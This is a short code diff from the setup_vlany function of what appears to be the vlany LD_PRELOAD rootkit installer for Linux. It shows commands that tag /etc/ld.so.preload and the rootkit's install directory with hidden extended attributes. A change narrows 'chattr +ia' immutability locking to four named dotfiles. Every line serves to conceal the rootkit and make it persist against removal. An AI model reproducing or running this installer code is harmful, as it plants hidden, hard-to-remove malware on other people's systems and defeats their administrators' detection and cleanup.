@@ -245,8 +245,7 @@ setup_vlany ()
     # protect files and directories
     setfattr -n user.${HIDDEN_XATTR_1_STR} -v ${HIDDEN_XATTR_2_STR} /etc/ld.so.preload
     setfattr -n user.${HIDDEN_XATTR_1_STR} -v ${HIDDEN_XATTR_2_STR} $INSTALL $INSTALL/* $INSTALL/.*
-    chattr +ia $INSTALL/*
-    chattr +ia $INSTALL/.*
+    chattr +ia $INSTALL/.profile $INSTALL/.bashrc $INSTALL/.shell_msg $INSTALL/.vlany_information
 }
 
 PYTHON_BIN="/usr/bin/python2"
